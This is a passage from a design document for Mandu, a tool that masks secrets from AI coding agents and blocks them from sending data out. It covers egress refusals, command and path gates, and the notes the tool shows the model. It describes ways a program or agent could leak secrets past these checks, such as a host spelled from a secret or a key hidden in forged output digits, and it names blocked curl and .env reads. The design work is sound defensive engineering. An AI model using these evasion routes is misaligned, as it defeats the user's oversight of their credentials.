`CLAUDE_CODE_SKIP_BEDROCK_AUTH=1` stays raw. The login credentials, Mandu's
routing and the law's `env.exempt` win over item 4 too; a config switch
does not (one whose value is a key in a known format is a credential, not
a switch). The login exemption is by name, for every target and every
child process: under `mandu claude` the user's `OPENAI_API_KEY` stays raw
too. Keying it to the launch target is an open decision, not built; the
user docs (README, `guarantees.md`, `usage.md`) state the exemption.
Tests: `secret-extract.test.ts`, `tests/stack/env-mask-agent-vars.test.ts`.

**Sources and bindings** (`comparisons.md` §3.4). The law's
`env.sources: [{ name, source, bindings? }]` fills a variable at launch from
`cmd:<command>`, `keyring:<service>/<account>` (secret-tool / security) or
`op://…` (1Password): the LAUNCHER resolves the source (it has the user's
terminal for an unlock prompt), hands the value to `registerEnvSecrets`,
and puts only the placeholder in the agent's environment. The symbol
carries the entry's bindings, so the egress gate releases it at those hosts
(`egress:secret-bound-trusted`) and asks elsewhere. A failed source falls
back to the shell's own value, masked; a sourced value the arbiter will not
register (the agent's own credential names) is emptied, never passed raw.
Bindings are relaxations (policy-delta `env`, `relaxationsOf` kind
`env-binding`). Not built: a TTL refresh (the value is read once per
launch). Tests: `policy-file-validate`, `policy-delta`, `secret-registry`
unit; launcher `secret-setup` unit; `tests/stack/env-sources.test.ts`.

**Stated gap: an env-var secret has no reader path.** The interposer
mediates `open()`; it cannot put a raw value into one process's environment
at `execve` without rewriting the tracee's memory. So an env-var secret is
twin-only: released at the wire, never raw to a program. That covers an
HTTP bearer token, not a signing credential consumed from the environment
(`AWS_SECRET_ACCESS_KEY` for SigV4). The launch notice names such a
variable and the way out: keep it in its file (`~/.aws/credentials`), where
the reader path applies.

### 11.5 The wire release is on by default

The baseline of §2.4 is only as useful as the network release, and a
symbol inside a TLS tunnel is blocked with a reason. Claude Code solves the
same problem by terminating TLS and installing its CA in the sandbox
(`tlsTerminate`); Mandu does the same by default. `netProxyMitm` is
tri-state: auto = ON when the confidentiality axis is on, degrading to the
blind tunnel with a notice when no session CA can be minted;
`--net-proxy-mitm` explicit (fail-closed); `--no-net-proxy-mitm` /
`net-proxy-mitm = false` / `MANDU_NET_PROXY_MITM=0` off. The session CA is
exported through `SSL_CERT_FILE` (which Go also reads),
`NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`,
`GIT_SSL_CAINFO`, `CARGO_HTTP_CAINFO`, `AWS_CA_BUNDLE` and
`CLOUDSDK_CORE_CUSTOM_CA_CERTS_FILE`, plus `NODE_USE_ENV_PROXY=1`; a
variable that replaces the CA set gets a combined system+session bundle
(`writeCaBundle`), never the session CA alone, or every direct (NO_PROXY)
connection would fail verification. Java reads none of them. Which clients
this serves is measured in [`confidentiality-plan-13-reader-set-labels.md §10`](confidentiality-plan-13-reader-set-labels.md).
A program that pins its certificate cannot use the twin path and becomes a
reader (§11.1). Live proof: `launcher/test/wire-release-live.test.sh` (a
real arbiter, the net-proxy with inspection, real `curl`: a shell-sourced
field token put back as the real value in the HTTPS body at the bound
host, the same request refused at an unbound host, the shell never holding
the value).

### 11.6 The workspace never authorizes a reader, a binding or an app rule

Claude Code honors `mask` entries only from user or managed settings and
ignores a repository's `.claude/settings.json`, because a repo that could
name `injectHosts` could route your token anywhere. Reader lists, bindings
and output rules have the same power. They are read from the arbiter-owned
`policy.yaml` under the user's config directory and from Inbox verdicts,
and from nowhere the agent can write: no workspace file, no environment
variable the agent's tree can set, no MCP tool. The loader refuses a
`readers:`/`apps:` key from any other source with a named reason.

### 11.7 The fallback posture is the baseline, not `off`

If the interposer cannot start (kernel too old, seccomp filter conflict,
the supervisor crashed), every file behaves as if it had no reader list:
structured twin for all, releases at the wire. The guarantee is unchanged;
`psql`-class consumers lose, and the launch notice and `mandu doctor` say
so in the same words the `gated` posture uses. The flow machinery is never
on the critical path of "does mandu launch".

### 11.8 Every mask and every denial explains itself in the tool result

CaMeL's measured utility loss was mostly a model not knowing why an action
failed. The `[mandu:secret]` note is the answer here. `buildSecretNote`
(`anthropic-proxy/src/rewrite-request.ts`, and its byte-identical twin in
the openai-proxy) renders, each with the way out:

- `masked:` (rule (i), or a backstop hit): "`deploy.sh` read `.env`; you
  see a symbol, and the user does not see this output unless your reply
  quotes the symbol (they then see its real value)";
- `masked:` (path-derived, 2026-10-05: no taint answer masked it, the
  command names a secret path): "the command names a secret file
  (./.env), so its whole output is hidden from you, including whether it
  succeeded; …", the paths as the model's own command wrote them
  (confidentiality.md §7.1, "the path-derived note"); since 2026-10-19,
  for a named file Mandu serves a twin of, what a read of that file on
  its own shows ("To use .env itself, read it on its own …: you see its
  keys and layout as written and each secret value as a symbol …", per
  twin kind; confidentiality.md §7.1, "The way to the file itself");
- `masked after the fact:` (2026-10-05: a result a proxy forwarded in
  clear in an earlier request, under this launch or, since 2026-10-09, an
  earlier one the conversation was resumed from, and masks now, after a
  label or a registration): "when you first read this result, earlier in this
  conversation, it showed you its real content; … What you wrote about it
  then came from that real content", static text, joined after any other
  line, with Mandu's `[mandu:after-the-fact]` system note in the same
  request (confidentiality.md §7.1, "Masked after the fact");
- `note:` (a listed reader whose rule released the output);
- `denied:` (an open the law or the human refused): "`cat` is not a reader
  of `.env`; the user can allow it from the Inbox";
- `held:` (a denial whose reason is the §12.2 ceiling, `held for N s,
  nobody answered`): names the Inbox row and says not to retry before the
  user answers;
- `twin:` (below);
- `refused:` (a connection the egress proxy refused from the call's tree,
  below).

The handling prompt tells the model to relay the note rather than retry.

The product's session page reads the same note (2026-10-07): a note made
only of `refused:`, `denied:` and `held:` lines masks nothing, and a
`denied:` or `held:` line makes the step one Mandu blocked, counted with
the page's and Home's blocks (dashboard.md §4.25b, *A refused read is a
block, not a mask*). The inspector reads it with the same rule
(`view-model/secret-note.ts`): its header, session list, step rail and 🛡
card count the step blocked, and a `held:` one asked as well.

**What the `masked:` note says the user sees (2026-10-04, maintainer
decision "option B").** It said "the user sees the full output", which is
false where the agent hides the call's output: Claude Code 2.1.288 shows a
Bash call collapsed ("Ran 1 shell command"), and a model that believed the
note told the human the output was in front of them without quoting the
symbol (`conf-hold-once`, `test-reorganization.md` §6.4). The note now says
the user does not see the output unless the reply quotes the symbol, which
is true: the reply filter shows the human the real value of a symbol the
reply carries. When to quote stays the model's call. Asking it to quote
every masked symbol (option A, rejected) would put each masked secret on
the human's screen whether or not they asked for it. Both proxies render
the same words, pinned by a unit test in each.

**Refused connections (2026-10-04).** A program the agent ran that tries
to send out through the net-proxy and is refused (the taint leg: it holds
a secret and the host is not bound; an unattributed sender while the
session holds one; a symbol the host may not receive; a registered value
in the request; an always-denied address; since 2026-10-05 a destination
on this machine, its own kind `this-machine`, exec-routing.md §7.5; since
2026-10-11 a secret's placeholder a shell emptied, kind `shell-expanded`,
whose line says to single-quote the placeholder and run it again instead
of the approvals hint, confidentiality.md §7; since 2026-10-17 a host that
is itself a placeholder, kind `symbol-destination`, below) used to leave the model only the
program's own error (`curl: (56) CONNECT tunnel failed, response 403`),
and when the tree read a secret, not even that: the result was one symbol
with a `masked:` line. The net-proxy now reports each refusal on the
arbiter's human plane (`recordEgressRefusal`, an attested report: nothing
is recorded from the data socket) by the sending processes and a KIND from
a fixed set, never the host or a request byte (a host can be spelled from
the very secret being blocked), awaited at most 1 s before the 403 goes
out. `callTaint` folds the refusals of the call's tree into
`refusedEgress` (the program, from the guard's argv record, and the kind),
and both model proxies add one `refused:` line per (program, kind):
`curl tried to connect out and Mandu refused the connection, nothing was
sent: it had read a secret, and the host is not one that secret is bound
to`, with the approvals hint where the user can allow it (never for a
tripwire refusal, kind `fingerprint`, for which no approval exists:
confidentiality.md §4, 2026-10-17). The line only
explains: a masked result stays masked, a clean one stays clean, nothing
is released by it. Not covered here: a command blocked by the exec-wrap
shim, whose own `mandu-exec-wrap: blocked …` stderr is the explanation
(Mandu's text, symbols only; it reaches the model with the command's
output, and is masked with it when the tree read a secret: then the
`blocked:` line below says it).
(`arbiter/test/component/egress-refusal.test.ts`,
`interceptors/net-proxy/test/unit/egress-refusal-note.test.ts`, both
proxies' `test/unit/egress-refusal-note.test.ts`,
`tests/stack/egress-refusal-note.test.ts`.)

*A refusal no process is tied to (2026-10-17).* The net-proxy finds the
sending process from `/proc` (plan 13 D6, `conn-attr.ts`
`attributeHolders`); when it finds none (a client that exited before the
scan, an unreadable `/proc`; a client on an IPv6 socket was one until
2026-10-17, plan 13 D6 "IPv6 attribution") the refusal stands as
before (an unattributed sender is refused while the session holds a
secret, and every other kind refuses it whoever sent it), and until this
date its note was dropped: `noteRefusal` returned on an empty holder list,
so the model saw only the program's error, or a symbol. The proxy now
reports it as well, as `recordEgressRefusal` with `procKeys: []` and
`unattributed: true` (the same attested report, the same kind, still no
host and no request byte). With no process, the arbiter cannot say which
call it was, and does not guess one: it ties the refusal to TIME, the way
the agent-flow leg does (plan 13 §4.5.1). It records the kind for the
session (`egress_refusals_unattributed`) only while a call of the session
is running (relayed by a model proxy, `call_pending`, and not yet asked
about, `call_asked`; with none running no call's result could carry it,
so nothing is recorded), and `callTaint` folds every one made inside a
call's window (relay to first ask) into `refusedEgress` as `{app: "",
kind, unattributed: true}`, one entry per kind. A call whose relay is
unknown gets none. Both proxies render it, byte-identically, without a
program:

`refused: a connection out was refused while this command ran, and
nothing was sent; Mandu could not tell which program opened it, so it may
not be this command's: <the kind's reason>.<the kind's way out>`

with the `unattributed` kind's reason worded for a line that already says
the program is unknown ("programs in this session hold a secret, and while
one does Mandu refuses a connection it cannot tie to a program"). Two
calls running together both get the line, hence "it may not be this
command's". **No host, not even here.** The destination would be the one
thing known about such a refusal, and it stays out for the reason it stays
out of the attributed line: the host (and the port) is a request byte, and
a program that read a secret can spell its host from it; an unattributed
connection is exactly the one Mandu cannot check for that (a model could
choose an unattributable socket on purpose), so a host in the note would
hand the model the value its masked output withholds. The kinds that are a
place (`this-machine`, `blocked-destination`) say what kind of place it
was. **No spam:** a program retrying in a loop adds one row per (session,
kind) per span of calls, not one per try (a row is added only when the
latest row of that kind is older than the latest running call's relay, so
each running call's window holds one), and a call's line is per kind
whatever the number of destinations or tries. Like every `refused:` line
it explains only: no mask is lowered or raised by it, and the refusal
itself is the proxy's, unchanged.
(`arbiter/test/unit/unattributed-egress-refusal.test.ts`,
`arbiter/test/component/egress-refusal.test.ts`,
`interceptors/net-proxy/test/unit/egress-refusal-note.test.ts`, both
proxies' `test/unit/egress-refusal-note.test.ts`,
`tests/stack/egress-refusal-unattributed-note.test.ts`.)

*A placeholder as the destination (2026-10-17).* A program asked to
connect to a host that is a `$MDU` placeholder (`curl https://$MDU:…/`) is
refused before any tunnel, check or dial: Mandu never resolves a
placeholder into a destination, since the host would carry the secret out
in the connection itself (DNS, SNI, the CONNECT line). On the CONNECT leg
that refusal was the one that reported nothing, attributed or not; on the
plain-HTTP leg such a host is no valid URL host, so the request was
answered 400 ("cannot determine destination") with no note either. Both
legs now refuse it as a refusal of its own kind, `symbol-destination`
(403 `symbol used as destination → block`), and report it like every
other one: by process when the proxy can tie the connection to one, else
as unattributed (above). The plain leg reads the host as written, the
request line's host and port (after any `user:password@`: a placeholder
there is a credential the gate judges, not a destination) or the Host
header, without a URL parse. The TLS-inspected (MITM) leg needs no check
of its own: its host is the CONNECT target, already checked, and it
re-originates with one Host naming that target, so a placeholder in the
decrypted request's Host header is a request byte the gate judges (and
notes) like any other. The line names neither the host nor the symbol,
only the generic `$MDU:…` the `shell-expanded` line uses: the model wrote
the symbol and has it, but echoing a placeholder back next to "host" would
only invite the same request again:

`refused: curl tried to connect out and Mandu refused the connection,
nothing was sent: its destination was a Mandu placeholder ($MDU:…), and
Mandu never turns a placeholder into a host to connect to. Do not retry
with a placeholder as the host: write the host itself, and use the
placeholder only where the secret's value belongs (a header or the body).
If the host itself is the secret, tell the user.`

There is nothing for the user to approve (no approvals hint): a host that
is itself a secret has no release through the egress proxy.
(`interceptors/net-proxy/test/unit/egress-refusal-note.test.ts`, both
proxies' `test/unit/egress-refusal-note.test.ts`,
`arbiter/test/component/egress-refusal.test.ts`,
`tests/stack/egress-refusal-symbol-destination-note.test.ts`.)

**Blocked commands (2026-10-07).** The exec-wrap shim's refusal (`curl`
and the other shadowed programs; exec-wrap gate.ts) is explained by its own
`mandu-exec-wrap: blocked …` stderr, and that text is hidden with the rest
of the output when the call's tree read a secret: the model saw one symbol
and guessed (the first-session tour). The shim runs in the agent's world,
so its word is not taken. The arbiter recomputes its verdict instead:
`callTaint` finds the shim's runs in the call's tree (the root and its
descendants) in the guard's `exec_argv` record, whose argv for a shim run
is `[<program>, <runtime flags…>, <exec-wrap entry>, <arguments…>]`
(`exec -a <program>` in the shim script; `shimInvocationArgv`), and asks
the same two questions the shim asked, `classifyExec(needsNetwork)` and
`resolveExecArgv` over the live symbol table (`policy/blocked-exec.ts`
`blockedExecFold`). Each command it would refuse is folded into
`blockedExec`: the program's NAME (a plain basename holding no placeholder
and no registered secret value, else "a program": argv[0] is the agent's
to choose) and the approval item's KIND (`symbol_as_command`,
`unsupported_command`, `secret_symbol`, else `other`), never an argument.
Both model proxies add one `blocked:` line per (program, kind), worded per
kind with what to do (byte-identical in both): `blocked: Mandu's command
check refused curl before it started, so it did not run and sent nothing:
its command line carries a placeholder and uses shell syntax Mandu cannot
check safely. Write it as one plain command (…), or tell the user.` Like
`refused:`, the line only explains: a masked result stays masked, a clean
one stays clean. Not named: a refusal the arbiter cannot recompute (the
service unreachable, the real program missing from PATH; the shim's
stderr still says so where the output is not masked), a call the recorder
could not bind and whose command no process exec'd (below), and a
recomputed verdict that differs from the shim's because the symbol table
changed in between.

*Codex's sandbox refused the shim's socket (2026-10-09, tour 8).* Codex
runs each command in its own sandbox, and with that sandbox's network off
its seccomp filter refuses every `connect`, the shim's dial to the arbiter
included (supported-agents.md §6.4). The shim then refuses the command
without asking (exit 77, nothing runs, nothing is sent), and its stderr
says why, but in a masked result the model saw only the symbol and took
its own command for the cause. Two gaps kept the line away, both closed:

- *The verdict.* There is none to recompute, since the shim never asked;
  but the sandbox is on the record. Codex runs the command through its
  helper, `codex-linux-sandbox` (its own binary under that name), whose
  argv carries the policy as JSON in `--permission-profile`, with
  `"network":"restricted"` or `"enabled"` (read off codex-cli 0.159.1,
  0.160.0 and 0.162.0; the e2e below passes on 0.144.1 too). The guard records that argv like any other.
  `codexSandboxNetworkOff` (provenance-store.ts) recognizes it, and a shim
  run whose process or an ancestor (the exec record's parent, else the
  lineage edge, at most 16 up) is such a helper goes into
  `codexSandboxShims`. `blockedExecFold` makes it the kind `codex_sandbox`,
  with no verdict. An older Codex's `--sandbox-policy` form was not
  measured and is not recognized (no line). The shim's own word is not
  taken here either: Codex sets `CODEX_SANDBOX_NETWORK_DISABLED=1` in the
  command's environment, and the shim reads it only to word its stderr.
- *The tree.* A Codex call under its sandbox bound to no shell until
  2026-10-09 (it binds to its sandbox helper now: plan 13 §3 D7, *Codex
  under its own sandbox*). The
  agent's child is the helper's process (`/proc/self/exe
  --codex-run-as-process-setup … codex-linux-sandbox … -- <shell> -c
  <snapshot preamble>`), whose argv the guard cuts short inside the
  shell-snapshot preamble, so no root candidate carries the command's
  signature. A process under the helper then execs `<shell> -c <the
  command>`. For a call the recorder did not bind, `callTaint` also takes
  the shim runs under the processes of the call's session that exec'd the
  call's recorded command (`commandShimExecs`: `callCommandSignatures`
  matched by `execSignatureForArgv`, exec'd no earlier than the proxy
  gated the call and no later than its result was first asked for), each
  with its descendants. This feeds the `blocked:` line only: it is not a
  binding, a taint row, a refused open or a refused connection, so it never
  lowers or raises a mask. The other kinds now reach a Codex call under
  its sandbox the same way.

Both proxies render the kind with its own head, since Mandu's check never
saw the command: `blocked: curl did not start, so it did not run and sent
nothing: Codex's own sandbox, whose network is off, refused its connection
to Mandu's command check, and Mandu never runs a command it could not
check; the command itself was not the problem, and from that sandbox it
could not have reached the network anyway. To run it, ask to run it
outside the sandbox (sandbox_permissions "require_escalated" with a
justification, where your approval policy allows it; the user is asked
first), or tell the user that sandbox_workspace_write.network_access =
true in their Codex config lets these commands reach Mandu.` Escalation
runs the command outside Codex's sandbox but still under Mandu (the
guard, the shim, the egress proxy), so the gate then decides; a launch
opens the sandbox's network by default anyway (supported-agents.md §6.5),
so the line appears where the user's Codex config, an administrator or
`--no-codex-shell-network` keeps it off. Two calls with the same command
text running at once, or a process that execs a call's text, can at most
add a line that is not that call's, the same bound as a bound tree's shim
runs (an argv is the agent's to choose). (`arbiter/test/unit/blocked-exec.test.ts`
and `arbiter/test/component/blocked-exec.test.ts` (the helper's argv
forms; the Codex tree over the wire, network off, on, and a run after the
first ask), both proxies' `test/unit/blocked-exec-note.test.ts`,
`tests/stack/blocked-exec-note.test.ts` (the Codex tree through the real
arbiter and the Codex proxy in production wiring),
`tests/sandbox/launcher/codex-sandbox-refusal-note.test.ts` (the real
launcher and the real `codex exec` against a scripted model: network off,
the masked result carries the line and the host gets nothing; network on,
curl reaches the host and no line).) A process that execs some other program with the
shim's argv shape can at most add a false `blocked:` line, never release
anything. In the default `secrets` mode a secret placeholder alone never
refuses a command (confidentiality.md §7.1), so the line appears where a
command also carries a non-secret placeholder in a shape the shim cannot
lower, or a placeholder where code runs. (`arbiter/test/unit/blocked-exec.test.ts`,
`arbiter/test/component/blocked-exec.test.ts`, both proxies'
`test/unit/blocked-exec-note.test.ts`, `tests/stack/blocked-exec-note.test.ts`.)

**The exec gate's own notice (2026-10-04).** A command the exec gate
blocks becomes `echo '<notice>' 1>&2; exit 77` (`exec-routing.md` §3.2),
and the notice (`mandu-exec-gate: blocked, nothing ran: <plain reason>.
detail: <arbiter reason>`) is how the model learns why. In the live run of
2026-10-03 (`conf-declassify-confines-session`, a HIGH session) it reached
the model as one `$MDU:nomodel_Bash[…]`: the classify verdict's path scan
reads the sentinel command, and a notice that says "secret" matches the
catalog's `*secret*` shape, so the result was masked `no-model`. No
process had read a secret and no output fold fired; the notice itself was
classified secret. The anthropic-proxy now remembers, per tool_use id, the
notice it delivered in each sentinel (`ExecGateNotices`, in memory,
bounded). A result is forwarded as that notice, in clear, only when its
body, with the harness's trailing `<system-reminder>` blocks split off and
trailing whitespace ignored, is **exactly** the notice or Claude Code's
`Exit code 77\n<notice>`, and the value backstop finds no registered value
in it. The forwarded text is the proxy's own string, never the received
bytes, and the reminder tail is dropped. Any other byte (a program's
output before, after or inside it, another exit status) sends the whole
result down the classify path, where it is masked as before, and the
notice is never split out of it. Nothing new reaches the model: the same
text is already in its context, in its own rewritten `tool_use`. A
restarted proxy has no record and masks as before.
(`interceptors/anthropic-proxy/test/unit/exec-gate-notice.test.ts`,
`tests/stack/exec-gate-notice.test.ts`.)

On Codex (2026-10-04; confirmed by test first: the openai-proxy returned the
notice as one `$MDU:nomodel_exec_command[…]`, the same path-scan hit) the
openai-proxy keeps the same record by `call_id` (`ExecGateNotices`) and
`gateNoticeOutput` matches two shapes, each whole: Codex's exec envelope
(`splitCodexExecEnvelope`'s grammar, saying exit 77: `Process exited with
code 77` or `(exit code 77)`) followed by exactly the notice, and an MCP
result (`splitCodexMcpOutput`) whose body is exactly the notice. The header
is forwarded as §9 R4 of plan 13 forwards a masked result's header
(`blankRunFacts`: exit code 0, wall time 0, no token count, the chunk id
kept), so the run's facts never reach the model by this exit either; the
text after it is the proxy's own notice. A program's byte beside the notice,
another exit status, a missing record or a backstop hit sends the output
down the classify path whole.
(`interceptors/openai-proxy/test/unit/exec-gate-notice.test.ts`,
`tests/stack/exec-gate-notice-codex.test.ts`.)

A code-mode cell the gate replaces WHOLE (2026-10-09; before, it had no
record and its notice reached the model as one symbol). The whole-cell
gate, a non-literal exec argument and a refused MCP command field each
replace the cell by the sentinel cell (`blockSentinelCell`), and
`transformScriptCell` now tells the stream rewriter the notice that cell
prints (`onCellBlocked`); the rewriter knows the cell's own `call_id` and
the proxy keeps the notice by it, marked as a whole-cell replacement. Such
a cell runs nothing but the sentinel and prints its output, so the script
runtime's head says the script `completed`, with no exit 77. For a
whole-cell record only, `gateNoticeOutput` also matches a
`custom_tool_call_output` whose script head is followed by exactly the
notice (or by the sentinel's own exec head saying exit 77, then exactly
the notice); the forwarded text is the R4-blanked script head and the
proxy's own notice. A per-literal block inside a cell keeps the exit-77
rule (the rest of the model's cell ran), and every other rule above
stands: a program's byte beside the notice, a missing record or a backstop
hit masks the output whole.
(`interceptors/openai-proxy/test/unit/script-cell.test.ts`,
`sse-rewrite-script-cell.test.ts`, `exec-gate-notice.test.ts`;
`tests/stack/exec-gate-cell-notice-codex.test.ts`.)

**The denied-only release.** A refused open's failure text (`cat: .env:
Permission denied`) would otherwise come back as one symbol, because the
classify verdict's path-derived level (the command NAMES a secret file)
guards against exactly the read the guard just refused. A tree with **no**
taint and at least one refused open lowers that path-derived level when the
value backstop (`scanSecretValues`) finds no registered value in the
output, so the model reads the program's own failure text plus the note; a
backstop hit, a missing backstop op, or any taint in the tree keeps the
mask. The release rests on the arbiter's recorded denial, never on the text
looking harmless (`tests/stack/secret-hold-timeout.test.ts`).

**The clean-tree release (2026-10-18).** A tree with no taint and no
refused open lowers the path-derived level too, when every secret path the
command names is a registered credential file (a counterfactual reading of
its paths with those files called public must come out public) and the
output holds no token and none of those files' secret bytes in any form the
arbiter looks for; each registered value in it becomes its own symbol.
Prompted by demo-c4's blind git (`git rm --cached .env`, `git
filter-branch --index-filter 'git rm --cached --ignore-unmatch .env'`). The
rules, the argument and the review rounds:
[clean-tree-release.md](./clean-tree-release.md).

**Path denials (2026-10-04).** The sensitive-path gate (`fs-gate.ts`,
`/mandu/denied/<reason>/<path>`, view-map-gated) and the derived-label
hook (`fs-label.ts`, `/dev/null/mandu-unlabeled/<path>`: a HIGH session
writing a path it cannot label) deny a path by rewriting it to a sentinel
the tool fails on. The tool's error came back as the result, and the
classify path scan read the sentinel: a denied `.env`, `id_rsa` or
`.aws/credentials` turned the error into a `$MDU:nomodel_…` symbol (probed
2026-10-04, `tests/stack/path-denial-notice.test.ts` red before the fix),
and any other path left the harness's bare error. Neither said why. Now,
when **every** path value of a call is a Mandu sentinel (and the call is
not a shell, whose denied working directory already turns its command
into the exec gate's sentinel, notice recorded), the anthropic-proxy
records a notice built from its own decision (`path-denial-notice.ts`:
`mandu-fs-gate: denied, nothing was read or written: <plain reason>.
path: <path> (<tool>.<field>). detail: <arbiter reason>`, one line per
denied path), and the request side **replaces** the whole result with it.
No byte of the tool's output is forwarded, filtered or not: the tool ran
against paths that do not exist, and what it said is discarded. The value
backstop must find no registered value in the notice; a call with any path
left real is not recorded and its result is classified as before; a
restarted proxy has no record. The patch leg (`apply_patch` header paths,
OpenClaw) refuses the patch whole instead (below). The openai-proxy
rewrites no paths.
(`interceptors/anthropic-proxy/test/unit/path-denial-notice.test.ts`,
`test/component/path-denial-notice.test.ts`.)

**The net gate's notice (2026-10-04).** A network call the net gate blocks
(`net-gate.ts`: the session leg, the per-symbol leg, the TLS leg, a
fail-closed bound) is pointed at `https://blocked.mandu.invalid/<why>`,
and its history is put back to the model's own URL (NetGateHistory). The
path scan never masked its result (a URL is exempt), but the result was
only the agent's error (`proxy refused the connection`): the model never
learned why (live run watch-20261003T143442, conf-callback-unbound). The
call's result is now replaced by `netBlockNotice`, built from the gate's
decision alone: which leg refused in one plain sentence, the approvals
hint when the arbiter's reason says it filed one, and the rule id. It
names no URL, no host, no query and repeats no arbiter reason (the reasons
name the destination the model wrote, and a host can itself be spelled
from what the session read). A tool with no destination field (WebSearch)
gets the same notice as its query, and a `block: "refuse"` tool the notice
as its refusal, in place of the arbiter's reason.
(`interceptors/anthropic-proxy/test/unit/net-denial-notice.test.ts`,
`tests/stack/net-denial-notice.test.ts`.)

**Refused calls (2026-10-04).** A call refused whole (`refusedToolInput`,
`dispatcherRefusalInput`: a tool on the refuse table, a refused form, a
patch whose header names a denied path, a blocked stdin write, a
dispatcher call that does not parse) runs nothing: its input is one the
tool's schema rejects. The model read only the agent's validation error
(OpenClaw: `Validation failed for tool "apply_patch": …`), which said
nothing of Mandu; the refusal's own words sat in the rewritten input. The
result is now replaced by `mandu: refused, nothing ran: <why>`, the
refusal's text, already in the model's history. All three kinds (paths,
net, refusals) share one store (`ResultNotices`), one rule (replace whole,
the value backstop clean, no record ⇒ classified as before), and one
property: the tool reached nothing real, so no byte it produced is
forwarded.

**What the backstop scans.** The secrets themselves (registry values and
their fields, a labeled file's content the model tried to read) and exec
outputs masked **on evidence**. An exec-output row (`nomodel_Bash`) is
minted for one of two reasons, and the reason decides whether it
fingerprints: on **evidence** (the provenance store shows a process in the
call's tree held a secret) the row is the secret's bytes as a reader
printed them and fingerprints, so the same bytes released later under
(ii)/(iii) or by a denied-only tree stay masked; on **precaution** (no
taint on record: the path-derived level, a fail-closed unknown) the row is
usually the command's own failure line and does not fingerprint, or one
masked "Permission denied" would mask itself forever. `scanSecretValues`
(`arbiter/ipc/server.ts`) asks `callTaint` for the row's own `call_id` and
keeps the row iff its level is non-null. The egress tripwire and the prompt filter
still count such a row, but since 2026-10-17 a row masked on precaution
by the path rule alone, from a bound tree with no raw read and naming
only files registered as they are, registers only its lines that hold a
registered secret or a credential shape (plan 15 §13.12).

**The twin in a shell result.** With no reader list the guard serves `cat
.env` the twin, so the output is keys and field symbols, yet the command
names `.env` and would come back as one symbol. A shell result gets the
read-twin test, with evidence added because the text comes from a program:

- **Content** (`structuredTwinExecOutputPath`, `claude-code-inbound.ts`):
  after Codex's own exec head (a Codex result only, see *Codex's head*
  below), the text holds at least one `$MDU:` token, every token is a
  field symbol of ONE registered file (`structuredTwinOfField`), and the
  text is one contiguous substring of that file's twin. `cat .env`,
  `grep KEY .env` and `head -3` qualify; `cat -n` (a gutter), two files, a
  raw value, a partial or forged token do not. A text with no token at all
  is not this rule's; a listing of the keys is ("A key listing" below). At
  most one final newline is framing (review of !1604); any other trailing
  whitespace must be the twin's own. A Codex script cell that prints the
  whole exec result object (`text(JSON.stringify(r))`) is tested by its
  `output` field when the body is exactly that object, printed canonically,
  every other field a bounded number or a short hex id; any other key or
  value type fails.
- **Codex's head** (review of !1604, second pass, 2026-10-17). The twin
  rules (this one, the whole-file and the key-listing rule) looked through a
  leading Codex exec head on EVERY agent's result, and its digit runs were
  unbounded. On Claude Code the head is not Codex's but the program's own
  text, so a program could print a well-formed head with a key spelled as
  digits (`Original token count: 115107…`) before the twin: the review's
  probe hid a 33-character key in 99 digits, no backstop hit, and it passed
  the structured rule as well as the key listing. Now a head is looked
  through only when the openai-proxy says the result is Codex's
  (`callTaint`'s `codexHead`; the arbiter keeps no Codex spec to read it
  from), only ONE head, only at the very start (Codex writes its own before
  the program's output, so a head after it is the program's and fails the
  content test), and only with its runs bounded to what Codex prints
  (`CODEX_TWIN_HEAD_SRC`: a chunk id of at most 8 hex, a wall time of at
  most 5+4 digits, an exit code of 3, a token count of 7). What the head
  then carries is Codex's: the chunk id it drew, and the run facts (exit
  code, wall time, token count) the program could always set, a few bits a
  call, as for any released result. The fingerprint exception for a twin
  piece row (`isTwinPieceRow`) still reads a row's value as a Codex result:
  it only spares twin text from being a fingerprint and releases nothing.
- **The registration is the twin's base** (review of !1604, second pass,
  2026-10-17). `structuredTwinFor` (the read-twin rule's twin, and through
  `structuredTwinOfField` the shell rule's) and the key listing's
  `structuredTwinWithSecretsFor` took the NEWEST `Read` row on the file's
  path as the twin's base without asking whether the registry minted it. A
  proxy's own `Read` row (a Read it masked whole; it carries the call id)
  is newer than the registration, and as the base it rendered no twin (no
  field rows under its hash): the read-twin rule, `cat .env` and the key
  listing all stopped answering for that file. Every later Read of the
  twin was then masked whole too, minting another such row, so the file's
  Reads never recovered. The base is now the registry's own row
  (`isRegisteredFileRow`: no call id). Tests: the component test
  `exec-output-key-listing.test.ts` (a masked Read's row a second newer
  than the registration; it failed before the fix).

  The same masked Read had a second, independent hold on the file. Its row
  holds the file's bytes, and "a twin line is no fingerprint" (below)
  covered only the registry's base row, so the proxy row's long token-free
  lines (a `.env` comment of 24 characters or more) were line fingerprints:
  every later Read, `cat` and key listing of the twin hit the value
  backstop and was masked whole. Now a proxy's row on a registered file's
  path takes the same exception from that file's own twin and secret texts
  (server.ts `registeredTwinOfPath`, in the value index's `twinOf`); a row
  on a path no registration covers keeps every line, and the row's whole
  value and value-bearing lines still hit. The argument is the base row's:
  such a line is verbatim in the twin the agent is shown, and holds none
  of the file's secret texts. Tests: `twin-line-fingerprint.test.ts`
  (component; failed before), `tests/stack/agent-read-twin.test.ts`
  (Claude Code's Read of the twin after two masked Reads is per key again;
  failed before, with or without the base fix; the raw file stays masked).
  One masked Read thus no longer leaves a file masked for the rest of the
  session. Whether this accounts for the 147 whole-file Reads of a
  registered `.env` in the live logs is not proven here: it explains every
  Read after the FIRST masked one, not why the first was masked.
- **Evidence** (`callTaint`): the arbiter answers `twinOf: [path]` only
  when the guard recorded the call's tree and no process in it opened a
  secret raw. With no record the text alone is not enough: a program that
  read the real bytes could choose which piece of the twin to print and so
  spell out bits of the secret.
- **Release** (both proxies, `secretTaintFor`): for a result that holds a
  `$MDU:` token and is at most 256 KiB, `twinOf` with a clean value
  backstop lowers the path-derived level, and the `twin:` note says: "this
  is `<path>` as you see it: the keys as written, each secret value a
  symbol. Use the symbol where the value belongs; the user sees the real
  values."
- **A twin piece is no fingerprint** (`isTwinPieceRow`, `server.ts`): a row
  whose value is one piece of one registered file's twin holds no secret
  byte, so it does not mask later renderings of the same twin.
- **A twin line is no fingerprint** (2026-10-05, `withoutTwinLines` in
  `egress-fingerprint.ts`, `registeredFileTwin` in `registry.ts`). A
  registered file's base row gave every line of 24 or more characters as a
  line fingerprint (`MIN_LINE_FINGERPRINT_LEN`), a comment too
  (`# fake values, made up by mandu demo`). The twin generator keeps every
